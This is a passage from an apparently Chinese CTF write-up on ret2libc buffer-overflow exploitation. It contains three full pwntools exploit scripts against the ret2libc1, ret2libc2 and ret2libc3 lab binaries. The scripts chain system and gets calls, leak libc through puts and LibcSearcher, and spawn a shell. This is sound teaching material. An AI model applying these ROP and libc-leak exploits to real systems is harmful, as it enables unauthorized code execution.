class="line">system = <span class="number">0x8048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>+system+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+binsh])<span class="string">&quot;&quot;&quot;这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以&#x27;bbbb&#x27; 作为虚假的地址，其后参数对应的参数内容。&quot;&quot;&quot;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h2><p>这里仍然用相同的流程，唯一不同的是没有直接给出/bin/sh,需要先调用gets函数再利用pop ret调用system函数</p><p><img src="https://img-blog.csdnimg.cn/20190228160834983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>直接给出python的脚本，与上一个例子相同，整体不再多赘述</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="number">0xdeadbeef</span>, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>我给出了堆栈溢出的ESP指向流程图，顺着思考容易看懂payload</p><p><img src="https://img-blog.csdnimg.cn/20190228160353314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><p><img src="https://img-blog.csdnimg.cn/20190228171912573.png" alt="img"></p><p>检查安全保护，只开启了NX</p><p><img src="https://img-blog.csdnimg.cn/20190228195219362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>IDA里查看，仍然是gets函数的堆栈溢出。</p><p>但是这里没有给system函数</p><p>也没有给定的/bin/sh</p><p>所以需要我们从libc中调用system函数</p><p><img src="https://img-blog.csdnimg.cn/20190228195812530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>根据这个知识点</p><p>写exp,涉及新的东西我仍然全部做注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">context.binary=<span class="string">&#x27;ret2libc3&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;ret2libc3&#x27;</span>) <span class="comment">#静态加载ELF文件</span></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>] <span class="comment">#获取指定文件的plt条目</span></span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>] <span class="comment">#获取指定文件的got条目</span></span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;_start&#x27;</span>] <span class="comment">#获取指定文件的函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak main_got addr and return main&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>,puts_plt,main,libc_start_main_got]) <span class="comment">#先使用plts_plt函数打印出main函数的在got表中的真实地址</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>]) <span class="comment">#获取main函数的真实地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_start_main_addr) <span class="comment">#获取libc</span></span><br><span class="line">libcbase = libc_start_main_addr-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>) <span class="comment">#获取libc基地址</span></span><br><span class="line">system_addr = libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>) <span class="comment">#获取system地址</span></span><br><span class="line">binsh_addr = libcbase +libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) <span class="comment">#获取binsh字符串地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;now get shell&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>,system_addr,<span class="string">&#x27;A&#x27;</span>*<span class="number">4</span>,binsh_addr]) <span class="comment">#这里开头‘A’的数量要具体到堆栈里调试观察，因为main函数开头先将ESP最后一位变为0即16位对齐，再减128.</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
